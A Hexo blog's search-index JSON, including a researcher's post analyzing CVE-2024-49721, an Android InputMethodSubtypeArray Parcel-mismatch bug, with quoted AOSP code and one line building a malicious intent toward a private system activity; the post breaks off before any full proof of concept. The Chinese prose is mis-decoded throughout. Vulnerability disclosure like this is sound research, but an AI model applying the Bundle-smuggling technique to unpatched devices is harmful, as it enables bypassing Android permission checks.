{"meta":{"title":"æ®‹é¡µçš„å°åšå®¢","subtitle":null,"description":"æ®‹é¡µçš„å°åšå®¢~","author":"æ®‹é¡µ","url":"https://blog.canyie.top","root":"/"},"pages":[{"title":"404 Not Found","date":"2025-04-24T10:33:02.803Z","updated":"2025-04-24T10:33:02.803Z","comments":true,"path":"404.html","permalink":"https://blog.canyie.top/404.html","excerpt":"","text":"404 Not Foundå•Šå“¦ï¼Ÿé¡µé¢ä¸è§äº†å‘¢......"},{"title":"","date":"2025-05-08T14:02:26.662Z","updated":"2025-05-08T14:02:26.662Z","comments":true,"path":"sw-register.js","permalink":"https://blog.canyie.top/sw-register.js","excerpt":"","text":"\"serviceWorker\"in navigator&&(console.log(\"loading custom service worker...\"),window.addEventListener(\"load\",()=>{navigator.serviceWorker.register(\"/sw.js\").then(e=>console.log(\"Service Worker registered with scope:\",e.scope)).catch(e=>console.log(\"Service Worker registration failed:\",e))}));"},{"title":"","date":"2025-05-08T14:30:35.069Z","updated":"2025-05-08T14:30:35.069Z","comments":true,"path":"sw.js","permalink":"https://blog.canyie.top/sw.js","excerpt":"","text":"self.addEventListener(\"install\",e=>{console.log(\"sw.js: installed service worker\"),self.skipWaiting()}),self.addEventListener(\"activate\",e=>{e.waitUntil(caches.keys().then(e=>Promise.all(e.map(e=>(console.log(\"sw.js: removing cache \"+e),caches.delete(e))))))});"},{"title":"æ‰€æœ‰åˆ†ç±»","date":"2025-04-24T10:33:02.827Z","updated":"2025-04-24T10:33:02.827Z","comments":true,"path":"categories/index.html","permalink":"https://blog.canyie.top/categories/index.html","excerpt":"","text":""},{"title":"å…³äº","date":"2025-05-08T07:28:24.827Z","updated":"2025-05-08T07:28:24.827Z","comments":true,"path":"about/index.html","permalink":"https://blog.canyie.top/about/index.html","excerpt":"","text":"æœ¬ç«™æ˜¯æ®‹é¡µæ— èŠæ­çš„ä¸€ä¸ªå°åšå®¢ï¼ŒåŸºäº GitHub Pages + Hexoï¼Œä¸»é¢˜ä¸º Volantiså…³äºæˆ‘ï¼šç½‘åå«â€œæ®‹é¡µâ€â€œcanyieâ€ æ˜¯äº”å…­å¹´çº§å°±å¼€å§‹ç”¨çš„ç½‘åäº†ã€‚å‡ºç”Ÿäº 2004/08/06ï¼Œä¸€ä¸ª 20 å²çš„ä¸­èŒæ¯•ä¸šç”Ÿï¼Œç›®å‰å¤§äºŒï¼Œå–œæ¬¢ç¼–ç¨‹ï¼Œå–œæ¬¢èˆªç©ºã€‚ç»ç’ƒå¿ƒï¼Œæƒ…ç»ªåŒ–ä¸¥é‡ã€‚Android Developer &amp; Security Researcherï¼Œç ”ç©¶æ–¹å‘ä¸»è¦åå‘ framework &amp; runtime ç­‰ç³»ç»Ÿå±‚é¢çš„Bugs:Android: contributed to CVE-2024-0044 (PoC &amp; writeup), CVE-2024-31318, CVE-2024-43080, CVE-2024-43081, CVE-2024-43088, CVE-2024-43090, CVE-2024-43762, CVE-2024-49733, CVE-2024-49741, CVE-2024-49743, CVE-2024-49744, CVE-2025-0100, CVE-2025-22432Huawei: CVE-2025-31175è‡´è°¢ä¸æ’åï¼šæˆªè‡³ 2025-05-08 åœ¨ Google Bug Hunters å¹³å°ä¸Šå…¨çƒæ€»æ’å 32ï¼ŒAndroid Program æ’åç¬¬ 6ï¼Œ2024 å¹´åº¦æ’å #6ï¼ˆä» 0 å¼€å§‹è®¡æ•°ï¼‰ã€‚ä½¿ç”¨æ˜µç§° canyie åœ¨ Android Security Acknowledgementsã€ Google Bug Hunters Leaderboardã€å°ç±³å®‰å…¨ä¸­å¿ƒã€åä¸ºå®‰å…¨å¥–åŠ±è®¡åˆ’æ€ç»´æ–¹å¼å’Œåˆ«äººä¸å¤ªä¸€æ ·ï¼Œå¯èƒ½ä»¤äººæ— æ³•ç†è§£ wwwï¼ˆæˆ‘åœ¨è¿™é‡Œï¼šQQèŠå¤© GitHub çŸ¥ä¹ çœ‹é›ªè®ºå› å“”å“©å“”å“© Google BugHunters"},{"title":"æˆ‘çš„æœ‹å‹ä»¬","date":"2025-04-24T10:33:03.133Z","updated":"2025-04-24T10:33:03.133Z","comments":true,"path":"friends/index.html","permalink":"https://blog.canyie.top/friends/index.html","excerpt":"","text":"å„ä½å¤§ä½¬æƒ³äº¤æ¢å‹é“¾çš„è¯å¯ä»¥åœ¨ issue åŒº ç•™è¨€ï¼Œå¿…é¡»è¦æœ‰åç§°ã€å¤´åƒé“¾æ¥ã€å’Œè‡³å°‘ä¸€ä¸ªæ ‡ç­¾å“¦ï½æ³¨ï¼šä»…æ¥å—ä¸ªäººç½‘ç«™ç”³è¯·ã€‚è‹¥æ‚¨çš„ç½‘ç«™åŸåˆ›å†…å®¹è¿‡å°‘ã€å†…å®¹è´¨é‡è¿‡ä½æˆ–ä¸ºå†…å®¹å†œåœºç±»ç½‘ç«™å¯èƒ½è¢«æ‹’ç»ã€‚å†…å®¹ä¸å¼ºåˆ¶ä¸ºæŠ€æœ¯ç±»ï¼Œä½†è‹¥å†…å®¹è¿‡äºæ•æ„Ÿæˆ–è¿åæ³•å¾‹å¯èƒ½è¢«æ‹’ç»ã€‚åç§°ï¼š æ®‹é¡µçš„å°åšå®¢å¤´åƒï¼š https://blog.canyie.top/data/image/avatar_new.jpgç½‘å€ï¼š https://blog.canyie.top/æ ‡ç­¾ï¼š Android"},{"title":"æ‰€æœ‰æ ‡ç­¾","date":"2025-04-24T10:33:03.133Z","updated":"2025-04-24T10:33:03.133Z","comments":true,"path":"tags/index.html","permalink":"https://blog.canyie.top/tags/index.html","excerpt":"","text":""},{"title":"","date":"2025-04-24T10:33:03.091Z","updated":"2025-04-24T10:33:03.091Z","comments":true,"path":"data/js/search_children.js","permalink":"https://blog.canyie.top/data/js/search_children.js","excerpt":"","text":"var domain=\"http://qzonestyle.gtimg.cn/qzone_v6/lostchild/\";document.write(''),document.write('');"}],"posts":[{"title":"CVE-2024-49721 InputMethodSubtypeArray ååºåˆ—åŒ–æ¼æ´åˆ†æ","slug":"CVE-2024-49721","date":"2025-02-04T14:00:00.000Z","updated":"2025-04-24T10:33:02.810Z","comments":true,"path":"2025/02/04/CVE-2024-49721/","link":"","permalink":"https://blog.canyie.top/2025/02/04/CVE-2024-49721/","excerpt":"ç¥é©¬ï¼Œéƒ½ 2025 å¹´å•¦ï¼Œè¿˜æœ‰ Parcel Mismatch æ¼æ´ï¼Ÿï¼ï¼Ÿå¯¹ï¼ä½ æ²¡å¬é”™ï¼æœ€ç»å…¸æœ€è¢«å¹¿æ³›åˆ©ç”¨çš„ Parcel Mismatch æ¼æ´ï¼Œå®ƒåˆåŒå’å•æ¥äº†ï¼æ€•äº†å—ï¼Ÿï¼ï¼Ÿå»å¹´æˆ‘å’Œ Cxxsheng å¯¹æ•´ä¸ª Parcelable IPC æœºåˆ¶è¿›è¡Œäº†ä¸€äº›ç ”ç©¶ï¼Œå¹¶å¼€å‘äº†ä¸€ä¸ªæ‰«æå™¨ç”¨ä»¥æ‰«æç›¸å…³æ¼æ´ã€‚æ­¤æ¼æ´å°±æ˜¯æˆ‘ä»¬ç ”ç©¶è¿‡ç¨‹ä¸­å‘ç°çš„æ¼æ´ä¹‹ä¸€ã€‚æˆ‘ä»¬äº 2024 å¹´ 12 æœˆ 3 æ—¥æäº¤æ¼æ´æŠ¥å‘Šï¼Œåè¢«å‘ŠçŸ¥ä¸å¦ä¸€ä»½æ¼æ´æŠ¥å‘Šé‡å¤ã€‚ä»¥ä¸‹è®°å½•äº†æˆ‘ä»¬å½“æ—¶çš„åˆ†æã€‚éƒ¨åˆ†æ•æ„Ÿä¿¡æ¯å·²è¢«ç§»é™¤æˆ–è„±æ•ä»¥ä¿è¯å®‰å…¨ã€‚","text":"ç¥é©¬ï¼Œéƒ½ 2025 å¹´å•¦ï¼Œè¿˜æœ‰ Parcel Mismatch æ¼æ´ï¼Ÿï¼ï¼Ÿå¯¹ï¼ä½ æ²¡å¬é”™ï¼æœ€ç»å…¸æœ€è¢«å¹¿æ³›åˆ©ç”¨çš„ Parcel Mismatch æ¼æ´ï¼Œå®ƒåˆåŒå’å•æ¥äº†ï¼æ€•äº†å—ï¼Ÿï¼ï¼Ÿå»å¹´æˆ‘å’Œ Cxxsheng å¯¹æ•´ä¸ª Parcelable IPC æœºåˆ¶è¿›è¡Œäº†ä¸€äº›ç ”ç©¶ï¼Œå¹¶å¼€å‘äº†ä¸€ä¸ªæ‰«æå™¨ç”¨ä»¥æ‰«æç›¸å…³æ¼æ´ã€‚æ­¤æ¼æ´å°±æ˜¯æˆ‘ä»¬ç ”ç©¶è¿‡ç¨‹ä¸­å‘ç°çš„æ¼æ´ä¹‹ä¸€ã€‚æˆ‘ä»¬äº 2024 å¹´ 12 æœˆ 3 æ—¥æäº¤æ¼æ´æŠ¥å‘Šï¼Œåè¢«å‘ŠçŸ¥ä¸å¦ä¸€ä»½æ¼æ´æŠ¥å‘Šé‡å¤ã€‚ä»¥ä¸‹è®°å½•äº†æˆ‘ä»¬å½“æ—¶çš„åˆ†æã€‚éƒ¨åˆ†æ•æ„Ÿä¿¡æ¯å·²è¢«ç§»é™¤æˆ–è„±æ•ä»¥ä¿è¯å®‰å…¨ã€‚æœ¬æ–‡åŒ…å«äº†ä¸€ä¸ªç®€å•çš„ PoCã€‚ç”±äºå¤§éƒ¨åˆ†ç”¨æˆ·éƒ½å·²ç»å‡çº§åˆ°æœ‰ checkKeyIntentParceledCorrectly é¢å¤–è¡¥ä¸çš„ç‰ˆæœ¬ï¼Œå‚ç…§ä»¥å‰ç±»ä¼¼æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ç›´æ¥æŠŠæœ¬æ–‡é‡Œçš„ PoC ä»£ç æ‹¿å»æ”»å‡»æ— æ³•æˆåŠŸï¼Œæ•…æˆ‘ä»¬è®¤ä¸ºå¤§éƒ¨åˆ†ç”¨æˆ·å·²ç»å¾—åˆ°ä¿æŠ¤ï¼ŒæŠ«éœ²ç›¸å…³ç»†èŠ‚æ˜¯å®‰å…¨çš„ã€‚æˆ‘ä»¬åœ¨æ­¤æ¬¡ç ”ç©¶ä¸­äº§å‡ºçš„å…¶ä»–æ–‡ç« ï¼ˆæŒç»­æ›´æ–°ï¼‰ï¼šä¸‡ä¼—ç©ç›®å´åˆè¢«å¤§å®¶å¿½ç•¥çš„å†å²æ¼æ´ï¼šCVE-2022-20474åˆ†æâ€”â€”LazyValueä¸‹çš„Self-changed Bundle by Cxxshengç»†èŠ‚æ£€å‡º android-12.0.0_r1 åˆ†æ”¯çš„æºç ï¼ŒæŸ¥çœ‹ InputMethodSubtypeArray.java è¿™ä¸ªæ–‡ä»¶ï¼ˆç‚¹å‡»å¯ç›´æ¥è·³è½¬ï¼‰ï¼Œå…³æ³¨å®ƒçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ã€‚ååºåˆ—åŒ–ï¼š1234567891011121314/** * Unmarshall an instance of &#123;@link InputMethodSubtypeArray&#125; from a given &#123;@link Parcel&#125; * object. * * @param source A &#123;@link Parcel&#125; object from which &#123;@link InputMethodSubtypeArray&#125; will be * unmarshalled. */public InputMethodSubtypeArray(final Parcel source) &#123; mCount = source.readInt(); if (mCount &gt; 0) &#123; mDecompressedSize = source.readInt(); mCompressedData = source.createByteArray(); &#125;&#125;åºåˆ—åŒ–ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Marshall the instance into a given &#123;@link Parcel&#125; object. * * &lt;p&gt;This methods may take a bit additional time to compress data lazily when called * first time.&lt;/p&gt; * * @param source A &#123;@link Parcel&#125; object to which &#123;@link InputMethodSubtypeArray&#125; will be * marshalled. */public void writeToParcel(final Parcel dest) &#123; if (mCount == 0) &#123; dest.writeInt(mCount); return; &#125; byte[] compressedData = mCompressedData; int decompressedSize = mDecompressedSize; if (compressedData == null &amp;&amp; decompressedSize == 0) &#123; synchronized (mLockObject) &#123; compressedData = mCompressedData; decompressedSize = mDecompressedSize; if (compressedData == null &amp;&amp; decompressedSize == 0) &#123; final byte[] decompressedData = marshall(mInstance); compressedData = compress(decompressedData); if (compressedData == null) &#123; decompressedSize = -1; Slog.i(TAG, \"Failed to compress data.\"); &#125; else &#123; decompressedSize = decompressedData.length; &#125; mDecompressedSize = decompressedSize; mCompressedData = compressedData; &#125; &#125; &#125; if (compressedData != null &amp;&amp; decompressedSize &gt; 0) &#123; dest.writeInt(mCount); dest.writeInt(decompressedSize); dest.writeByteArray(compressedData); &#125; else &#123; Slog.i(TAG, \"Unexpected state. Behaving as an empty array.\"); dest.writeInt(0); &#125;&#125;å¾ˆæ˜æ˜¾èƒ½çœ‹å‡ºæ¥ä¸¤è¾¹é€»è¾‘ä¸ä¸€è‡´ã€‚ååºåˆ—åŒ–çš„æ—¶å€™é¦–å…ˆä¼šè¯»ä¸€ä¸ª int ä½œä¸º countï¼Œcount å¤§äº 0 çš„æ—¶å€™æ‰ä¼šè¯» decompressed sizeï¼ˆintï¼‰å’Œ compressed data ï¼ˆbyte[]ï¼‰ã€‚è€Œåºåˆ—åŒ–çš„æ—¶å€™ï¼Œcount == 0 çš„æ—¶å€™ç¡®å®åªä¼šå†™ä¸€ä¸ª int 0 è¿›å»ï¼Œå¦‚æœ count ä¸ä¸º 0ï¼Œåº•ä¸‹æœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œä¸€ä¸ªåˆ†æ”¯ä¼šå†™ countï¼ˆintï¼‰ã€decompressed sizeï¼ˆintï¼‰å’Œ compressed dataï¼ˆbyte[]ï¼‰ï¼Œå¦ä¸€ä¸ªåˆ†æ”¯åªä¼šå†™ int 0 ä½œä¸º countã€‚æ‰€ä»¥é—®é¢˜å°±åœ¨äºè¿™ä¸ª countã€‚ç®€å•æšä¸¾ä¸€ä¸‹æ‰€æœ‰æƒ…å†µï¼šcount &gt; 0 çš„æ—¶å€™ï¼Œä¸€è¾¹å†™ intã€intã€byte[] è¿›å»ï¼Œå¦ä¸€è¾¹è¯» intã€intã€byte[] å‡ºæ¥ï¼Œæ²¡é—®é¢˜ï¼›count == 0 çš„æ—¶å€™ï¼Œä¸€è¾¹åªä¼šå†™ int 0 è¿›å»ï¼Œå¦ä¸€è¾¹è¯» int å‡ºæ¥ï¼Œä¹Ÿæ²¡é—®é¢˜ã€‚è€Œå¦‚æœ count &lt; 0ï¼Œå°±æœ‰å¯èƒ½å‘ç”Ÿä¸€è¾¹å†™äº† intã€intã€byte[] è¿›å»ï¼Œè€Œå¦ä¸€è¾¹åªè¯»äº†ä¸€ä¸ª int å‡ºæ¥çš„æƒ…å†µï¼Œé€ æˆæ•°æ®æ®‹ç•™ï¼Œä¹Ÿå³æ‰€è°“çš„ parcel mismatch é—®é¢˜ã€‚é‚£ä¹ˆé—®é¢˜å°±è½¬æ¢æˆï¼Œåœ¨æ”»å‡»è€…æŒ‡å®šè´Ÿæ•° count çš„æƒ…å†µä¸‹ï¼Œæ˜¯å¦å­˜åœ¨èƒ½è®© compressedData != null &amp;&amp; decompressedSize &gt; 0 çš„æƒ…å†µï¼Œä»è€Œå¤šå†™å†…å®¹è¿› parcelï¼Ÿæ³¨æ„åˆ°è¿™ä¸ª if ä¸Šé¢è¿˜æœ‰ä¸ª ifï¼Œå½“ compressedData == null &amp;&amp; decompressedSize == 0 æ—¶ï¼Œä¼šè°ƒç”¨ marshall å’Œ compress å¯¹ä¸¤ä¸ªå­—æ®µè¿›è¡Œé‡æ–°èµ‹å€¼ã€‚è¿™å°±æ˜¯ count &lt; 0 çš„æ—¶å€™ä¼šå‘ç”Ÿçš„æƒ…å†µï¼Œçœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°çš„å®ç°ï¼š12345678910111213141516171819202122232425private static byte[] marshall(final InputMethodSubtype[] array) &#123; Parcel parcel = null; try &#123; parcel = Parcel.obtain(); parcel.writeTypedArray(array, 0); return parcel.marshall(); &#125; finally &#123; if (parcel != null) &#123; parcel.recycle(); parcel = null; &#125; &#125;&#125;private static byte[] compress(final byte[] data) &#123; try (final ByteArrayOutputStream resultStream = new ByteArrayOutputStream(); final GZIPOutputStream zipper = new GZIPOutputStream(resultStream)) &#123; zipper.write(data); zipper.finish(); return resultStream.toByteArray(); &#125; catch(Exception e) &#123; Slog.e(TAG, \"Failed to compress the data.\", e); return null; &#125;&#125;æˆ‘ä»¬çš„ä¾‹å­é‡Œè¦å‹ç¼©çš„æ•°æ® mInstance æ˜¯ nullï¼Œåœ¨ writeTypedArray é‡Œä¼šå†™ä¸€ä¸ª -1 è¿›å»ä½œä¸ºé•¿åº¦ï¼Œè¿”å›ä¸€ä¸ªæœ‰æ•°æ®çš„ byte[]ï¼Œç„¶åè¿›å…¥ compress é‡Œè¿›è¡Œ gzip å‹ç¼©ï¼Œæœ€åç”Ÿæˆæœ‰å†…å®¹çš„ byte[]ï¼Œåˆšå¥½æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶ï¼Œè§¦å‘æ¼æ´ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ¼æ´åœ¨ Android 14 ä¸­å·²ç»è¢«ä¿®å¤ï¼Œè¡¥ä¸ï¼š https://github.com/aosp-mirror/platform_frameworks_base/commit/bc2fbfc0b73535ce9d0c9f73b5130cfffaf4daeeç„¶è€Œè¿™ä¸ªè¡¥ä¸åœ¨å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´å†…å¹¶æ²¡æœ‰è¢«å½“æˆå®‰å…¨è¡¥ä¸åå‘ç§»æ¤åˆ°æ—§ç‰ˆæœ¬ã€‚å¤ç°æ­¤æ¼æ´å±äºæˆ‘ä»¬æ‰€è°“çš„ Parcel Mismatch æ¼æ´ï¼Œè¿™æ˜¯ä¸€ç±»æœ€æ—©å¯è¿½æº¯è‡³ 2014 å¹´çš„æ¼æ´ï¼Œæœ€æ—©ç”± Michal Bednarski æŠ¥å‘Šã€‚å¯¹äºæ­¤ç±»æ¼æ´åº”è¯¥å¦‚ä½•åˆ©ç”¨ï¼Œéœ€è¦ä¸€äº›å‰ç½®çŸ¥è¯†ã€‚è¿™é‡Œä¸èµ˜è¿°ï¼Œç»™å‡ºä¸€äº›ç›¸å…³æ–‡ç« ä¾›å¤§å®¶å‚è€ƒï¼šç»å…¸çš„å…¥é—¨æ•™ç¨‹ï¼šBundleé£æ°´â€”â€”Androidåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä¸åŒ¹é…æ¼æ´è¯¦è§£ by heeeeenï¼Œè™½ç„¶å¹´ä»£ä¹…è¿œä½†å¹¶ä¸å½±å“å­¦ä¹ æ¯”è¾ƒæ–°çš„æ–‡ç« ï¼Œcover äº†æ›´å¤š caseï¼šParcelableå’ŒBundleçš„çˆ±æ¨æƒ…ä»‡ï¼ˆä¸€ï¼‰â€”â€”è¯»å†™ä¸åŒ¹é… by OPPOå®‰ç€å®éªŒå®¤å¦ä¸€ç¯‡å¾ˆå¥½çš„å…¥é—¨æ–‡ç« ï¼ŒPoC é‡Œè¯¦ç»†è§£é‡Šäº†æ¯ä¸€ä¸ªå€¼çš„ä½œç”¨åŠ mismatch åçš„æ–°æ„ä¹‰ï¼šå†è°ˆParcelableååºåˆ—åŒ–æ¼æ´å’ŒBundle mismatch by å°è·¯ç›¸å…³æ¼æ´å¤§æ€»ç»“ï¼šAndroid ååºåˆ—åŒ–æ¼æ´æ”»é˜²å²è¯ by æœ‰ä»·å€¼ç‚®ç°ä¸€ç¯‡ä¸»è¦å…³æ³¨å®é™…å„ç±»æ¼æ´å¦‚ä½•åˆ©ç”¨çš„æ–‡ç« ï¼šLaunchAnyWhere è¡¥ä¸ç»•è¿‡ï¼šAndroid Bundle Mismatch ç³»åˆ—æ¼æ´ å¤ç°ä¸åˆ†æ by Clangè£ç¼åº—è¯»è€…ä¹Ÿå¯ä»¥è‡ªè¡Œä¸Šç½‘æœç´¢ï¼Œå…³é”®è¯ï¼š Android Parcel Mismatchã€Bundle Mismatchã€Self-changing Bundle åŠ EvilParcel bug ç­‰ã€‚å‚è€ƒä»¥å¾€ parcel mismatch æ¼æ´çš„åˆ©ç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œæ„é€ ä¸€ä¸ª self changing bundle å¹¶æŠŠä¸€ä¸ªæ¶æ„çš„æŒ‡å‘ç³»ç»Ÿç§æœ‰æœªå¯¼å‡º PlatLogoActivity çš„ intent éšè—è¿›å»ã€‚æ„é€ çš„æ¶æ„ intentï¼š1new Intent().setClassName(\"android\", \"com.android.internal.app.PlatLogoActivity\")éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒAndroid 13 å¼•å…¥çš„ Lazy Bundle å¢å¼ºæªæ–½å¯¼è‡´æˆ‘ä»¬æ— æ³•å†ä½¿ç”¨è¿™ç§ parcel mismatch æ„é€  self changing bundleï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ Android 12 æˆ–æ›´æ—§çš„ç‰ˆæœ¬è¿›è¡Œæµ‹è¯•ã€‚è¾ƒæ–°çš„å®‰å…¨è¡¥ä¸é‡Œå¼•å…¥äº†ä¸€ä¸ªé¢å¤–çš„å®‰å…¨æ£€æŸ¥ checkKeyIntentParceledCorrectly å¯¹æ•´ä¸ª AccountManagerService è¿›è¡Œäº†åŠ å›ºï¼Œå¯¼è‡´æˆ‘ä»¬å³ä½¿ä½¿ç”¨ android 12ï¼Œå¦‚æœå®‰å…¨è¡¥ä¸æ¯”è¾ƒæ–°ï¼Œåƒå¾€å¸¸ä¸€æ ·ç›´æ¥æŠŠæ¶æ„ bundle è¿”å›ç»™ AccountManagerService ä¹Ÿæ— æ³•è§¦å‘æ¼æ´ã€‚è¿™é‡Œæˆ‘ä»¬åªåœ¨ä»£ç é‡Œæ¨¡æ‹Ÿä¸€ä¸‹æ•´ä¸ªæµç¨‹ã€‚InputMethodInfoå¦‚æœä½ ç›´æ¥æŒ‰ç…§å¾€å¸¸çš„ç»éªŒåœ¨ parcel é‡Œå†™å…¥ InputMethodSubtypeArray çš„ç±»åï¼Œå†™å…¥æ¶æ„æ•°æ®ç„¶åç›´æ¥ä½¿ç”¨ï¼Œæ­å–œä½ æ”¶åˆ°ä¸€ä¸ª BadParcelableException ä½œä¸ºç»“æœã€‚è¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬å¯çˆ±çš„ InputMethodSubtypeArray è¿™ä¸ªç±»ï¼Œæ ¹æœ¬å°±æ²¡æœ‰å®ç° Parcelable è¿™ä¸ªæ¥å£ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ ¹æœ¬ä¸æ˜¯ä¸€ä¸ª parcelableã€‚ä»£ç é‡Œå”¯ä¸€ä¼šç”¨åˆ°è¿™ä¸ªç±»çš„åœ°æ–¹å°±æ˜¯ InputMethodInfoï¼Œè¿™ä¸ªç±»å¯å°±æ˜¯æ ¹æ­£è‹—çº¢çš„ Parcelable äº†ï¼Œå®ƒåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹éƒ½ä¼šè°ƒç”¨åˆ° InputMethodSubtypeArrayï¼š12345678910111213141516171819202122232425262728293031323334353637InputMethodInfo(Parcel source) &#123; mId = source.readString(); mSettingsActivityName = source.readString(); mIsDefaultResId = source.readInt(); mIsAuxIme = source.readInt() == 1; mSupportsSwitchingToNextInputMethod = source.readInt() == 1; mInlineSuggestionsEnabled = source.readInt() == 1; mSuppressesSpellChecker = source.readBoolean(); mShowInInputMethodPicker = source.readBoolean(); mIsVrOnly = source.readBoolean(); mService = ResolveInfo.CREATOR.createFromParcel(source); mSubtypes = new InputMethodSubtypeArray(source); mHandledConfigChanges = source.readInt(); mForceDefault = false;&#125;/** * Used to package this object into a &#123;@link Parcel&#125;. * * @param dest The &#123;@link Parcel&#125; to be written. * @param flags The flags used for parceling. */@Overridepublic void writeToParcel(Parcel dest, int flags) &#123; dest.writeString(mId); dest.writeString(mSettingsActivityName); dest.writeInt(mIsDefaultResId); dest.writeInt(mIsAuxIme ? 1 : 0); dest.writeInt(mSupportsSwitchingToNextInputMethod ? 1 : 0); dest.writeInt(mInlineSuggestionsEnabled ? 1 : 0); dest.writeBoolean(mSuppressesSpellChecker); dest.writeBoolean(mShowInInputMethodPicker); dest.writeBoolean(mIsVrOnly); mService.writeToParcel(dest, flags); mSubtypes.writeToParcel(dest); dest.writeInt(mHandledConfigChanges);&#125;mSubtypes å°±æ˜¯ InputMethodSubtypeArrayã€‚éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯ Android 12 çš„æºç ï¼Œæ–°çš„ç‰ˆæœ¬é‡Œå¾€è¿™ä¸ªç±»åŠ å…¥äº†å…¶ä»–å­—æ®µï¼Œä¼šå½±å“æˆ‘ä»¬æ„é€  bundle çš„ç»“æ„ï¼Œè¿™éƒ¨åˆ†ä¸é‡è¦ï¼Œè¿™é‡Œç•¥è¿‡ä¸è®²ã€‚å¤šå­—èŠ‚ï¼Ÿå°‘å­—èŠ‚ï¼å¾€å¸¸çš„æ¼æ´é‡Œï¼Œå¤šå‡ºçš„æˆ–è€…å°‘æ‰çš„æ•°æ®ä¸€èˆ¬æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œå› ä¸º parcelable æœ¬æ¥å°±æ˜¯ä¼ è¾“å¯¹è±¡å†…éƒ¨æ•°æ®çš„ï¼Œä» parcel è¯»å‡ºæ”»å‡»è€…æŒ‡å®šçš„æ¶æ„æ•°æ®ç„¶åå†æŠŠå®ƒå†™è¿› parcel æ˜¯éå¸¸åˆç†çš„ã€‚åƒå¤šå‡º 4 ä¸ªå­—èŠ‚çš„æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡å®šä¸€ä¸ª 0 æ¥æ„é€  bundleï¼Œè®© bundle è¯»å‡ºä¸€ä¸ªåŸæœ¬ä¸å­˜åœ¨çš„ 0 é•¿å­—ç¬¦ä¸²å½“æˆ key ä»è€Œå½±å“åç»­è§£æã€‚è€Œè¿™ä¸ªæ¼æ´é‡Œå¤šå‡ºæ¥çš„å¯ä¸æ­¢å››ä¸ªå­—èŠ‚ï¼Œè€Œæ˜¯ä¸€ä¸ª int å’Œä¸€ä¸ª byte[]ï¼Œæ•°æ®ç¨³å®šä½†å¹¶ä¸å—æˆ‘ä»¬æ§åˆ¶ã€‚ç»è¿‡å®éªŒï¼Œparcel å†…ä¼šæ®‹ç•™ 32 å­—èŠ‚æ•°æ®ï¼Œå¤šå†™çš„ (int) decompressedSize ä½œä¸º size ä¼šåœ¨ InputMethodInfo è¢«å½“æˆ mHandledConfigChanges è¯»å–ï¼Œåç»­ bundle å†è¯»å–ä¸€ä¸ª String16 å½“æˆ keyï¼Œè¿™é‡Œå®é™…è¯»å–ä½ç½®å·²ç»åœ¨ byte[] é‡Œã€‚è¯» String16 ä¼šå…ˆè¯»ä¸€ä¸ª int ä½œä¸º lengthï¼Œè€Œå†™ byte[] æ­£å¥½ä¹Ÿä¼šå…ˆå†™ length è¿›å»ï¼Œæ‰€ä»¥ byte[] çš„ length ä¼šè¢«å½“æˆ String16 çš„ lengthã€‚ç¼–å†™æµ‹è¯•ä»£ç æŠŠæ®‹ç•™çš„ç¬¬ä¸€ä¸ª int è¯»å‡ºæ¥ï¼Œç»“æœä¸º 24ï¼Œè€Œæ€»çš„æ®‹ç•™å¤§å°ä¸º 32ï¼Œå‡å»ä¸¤ä¸ª int çš„å¤§å°ï¼Œçš„ç¡®å°±æ˜¯ 24ã€‚å¾ˆåˆç†ã€‚ç„¶åä½ ä¼šè§‰å¾— key é•¿åº¦åˆšå¥½ç­‰äº byte[] é•¿åº¦æ‰€ä»¥åˆšå¥½ä¼šæŠŠæ•´ä¸ª byte[] éƒ½æ¶ˆè€—æ‰ï¼Ÿå½“ç„¶ä¸å¯¹ï¼Œkey ä½œä¸ºä¸€ä¸ª String16ï¼Œé‡Œé¢ä¸€ä¸ªå­—ç¬¦å ä¸¤ä¸ªå­—èŠ‚ï¼ŒåŒæ—¶ç»“å°¾å¿…é¡»æ˜¯ \\0 ä½œä¸ºç»“æŸç¬¦ï¼Œæ‰€ä»¥å®é™…æ¶ˆè€—çš„æ•°æ®ä¼šæ¯” byte[] æ›´å¤šï¼ŒæŒ‰ç…§å¤šå‡ºå­—èŠ‚çš„æ€è·¯å»æ„é€ æ˜¯ä¸å¯¹çš„ï¼Œæˆ‘ä»¬åº”è¯¥æŒ‰ç…§å°‘äº†å­—èŠ‚çš„æ€è·¯å»è¡¥é½è¿™ä¸ª keyï¼Œç„¶åå†åœ¨åé¢å»å¡«å……æ¶æ„ payloadã€‚ä¸€å¼€å§‹ç”±äºé•¿åº¦çš„è®¡ç®—é”™è¯¯ï¼Œæˆ‘ä»¥ä¸ºè¿™ä¸ªé•¿åº¦ä¸å¤Ÿæˆ‘æŒ‰ä»¥å¾€çš„â€œæ’å…¥ä¸€ä¸ª VAL_BYTEARRAY â€çš„æ–¹å¼å»éšè—æ¶æ„ intentï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œç»™å‡ºçš„ PoC æ˜¯æŠŠ intent éšè—åœ¨äº†ä¸‹ä¸€ä¸ª key é‡Œé¢ï¼Œä»¥å‰éƒ½æ²¡æ€ä¹ˆçœ‹è§è¿‡æœ‰äººè—è¿› string é‡Œé¢ï¼Œç®—æ˜¯æ¯”è¾ƒæ–°çš„æ€è·¯ï¼Ÿåé¢å‘ç°å¤§å°åº”è¯¥æ˜¯å¤Ÿçš„ï¼Œæ‡’å¾—å†æ”¹ä»£ç äº†ã€‚ä¸è¿‡è¿™ç§æ–¹æ³•æœ‰ä¸ªç¼ºé™·ï¼Œå› ä¸º intent ç°åœ¨æ˜¯ key 